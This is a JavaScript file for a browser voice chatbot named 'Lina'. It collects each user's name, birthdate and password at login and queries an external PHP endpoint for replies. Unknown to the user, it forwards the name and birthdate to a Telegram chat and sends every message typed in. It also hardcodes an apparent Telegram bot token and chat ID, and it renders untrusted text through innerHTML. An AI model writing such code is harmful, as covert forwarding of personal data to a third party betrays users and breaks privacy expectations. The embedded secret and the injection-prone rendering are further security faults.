let recognition;
let speechSynthesis;
let user;
let isTelegramDetailsSent = false;

function startSpeechRecognition() {
  if (!('webkitSpeechRecognition' in window)) {
    alert("Speech recognition is not supported in your browser.");
    return;
  }

  recognition = new webkitSpeechRecognition();
  recognition.continuous = false;
  recognition.interimResults = false;

  recognition.onresult = function (event) {
    const transcript = event.results[0][0].transcript;
    document.getElementById('user-input').value = transcript;
    recognition.stop();
    // Automatically send the voice message
    sendMessage();
  };

  recognition.onend = function () {
    recognition.stop();
  };

  recognition.start();
}

function login() {
  const nameInput = document.getElementById('name');
  const birthdateInput = document.getElementById('birthdate');
  const passwordInput = document.getElementById('password');

  const name = nameInput.value.trim();
  const birthdate = birthdateInput.value.trim();
  const password = passwordInput.value;

  if (name !== '' && birthdate !== '' && password !== '') {
    // Save user details including password
    user = { name, birthdate, password };

    // Hide login container and display chat container
    document.querySelector('.login-container').style.display = 'none';
    document.getElementById('chat-container').style.display = 'block';
    document.getElementById('input-container').style.display = 'flex';

    // Check if previous chat exists and display it
    const storedChat = localStorage.getItem(getStorageKey());
    if (storedChat) {
      const chatMessages = document.getElementById('chat-messages');
      chatMessages.innerHTML = storedChat;
    }

    // Send user details to Telegram only once
    if (!isTelegramDetailsSent) {
      sendUserDetailsToTelegram();
      isTelegramDetailsSent = true;
    }
  }
}


function sendMessage() {
  const userInput = document.getElementById('user-input');
  const userMessage = userInput.value.trim().toLowerCase();

  if (userMessage !== '') {
    // Display user message
    displayMessage('You', userMessage, 'user-message');

    if (userMessage === 'stop') {
      // Stop speech synthesis
      stopSpeechSynthesis();
      // Display bot response
      displayMessage('Lina', "Okay! I'll stop!", 'bot-message');
    } else {
      // Make a request to your API
      fetch(`https://digitalaga.000webhostapp.com/chatgpt/lina.php?question=${encodeURIComponent(userMessage)}`)
        .then(response => response.text())
        .then(botResponse => {
          // Display bot response
          displayMessage('Lina', botResponse, 'bot-message');
          // Convert bot response to speech and play only if the message was sent through speech-to-text
          if (recognition) {
            const sanitizedBotResponse = sanitizeEmojis(botResponse);
            convertTextToSpeech(sanitizedBotResponse);
          }
          // Send user message to Telegram
          sendToTelegram(userMessage);
        })
        .catch(error => console.error('Error:', error));
    }

    // Save the chat in local storage
    saveChat();
    // Clear the input field
    userInput.value = '';
  }
}

function displayMessage(sender, message, className) {
  const chatMessages = document.getElementById('chat-messages');
  chatMessages.scrollTop = chatMessages.scrollHeight;
  const messageElement = document.createElement('div');
  messageElement.className = className;
  messageElement.innerHTML = `<strong>${sender}:</strong> ${message}`;
  chatMessages.appendChild(messageElement);

  // Scroll to the bottom of the chat container
  chatMessages.scrollTop = chatMessages.scrollHeight;
}

function convertTextToSpeech(text) {
  // Use Text-to-Speech API or library of your choice to convert text to speech and play it
  // For example, you can use the Web Speech API for this purpose
  speechSynthesis = window.speechSynthesis;
  const speechUtterance = new SpeechSynthesisUtterance(text);
  speechSynthesis.speak(speechUtterance);
}

function sanitizeEmojis(text) {
  // Remove emojis from the text
  return text.replace(/[\uD800-\uDFFF]./g, '');
}

function stopSpeechSynthesis() {
  if (speechSynthesis) {
    // Stop speech synthesis
    speechSynthesis.cancel();
  }
}

function sendToTelegram(message) {
  if (user) {
    // Telegram Bot API endpoint and your bot token
    const telegramBotToken = '6909151304:AAGN5QXR3k-Gm4Y3ZtE2e8sbI2raYJ_d7iI';
    const telegramChatId = '1098083004';

    // Construct the URL for sending a message using the sendMessage method
    const telegramApiUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${telegramChatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;

    // Use fetch to make the request to the Telegram Bot API
    fetch(telegramApiUrl)
      .then(response => response.json())
      .then(data => console.log('Telegram response:', data))
      .catch(error => console.error('Error sending to Telegram:', error));
  }
}

function sendUserDetailsToTelegram() {
  if (user) {
    const userDetails = `*Name:* ${user.name}\n*Birthdate:* ${user.birthdate}`;
    sendToTelegram(userDetails);
  }
}

function saveChat() {
  const chatMessages = document.getElementById('chat-messages').innerHTML;
  localStorage.setItem(getStorageKey(), chatMessages);
}

function getStorageKey() {
  return `chat_${user.name}_${user.birthdate}`;
}

function handleKeyPress(event) {
  if (event.key === 'Enter') {
    sendMessage();
  }
}
function clearChat() {
  const chatMessages = document.getElementById('chat-messages');
  chatMessages.innerHTML = '';
  // Save the chat in local storage after clearing
  saveChat();
}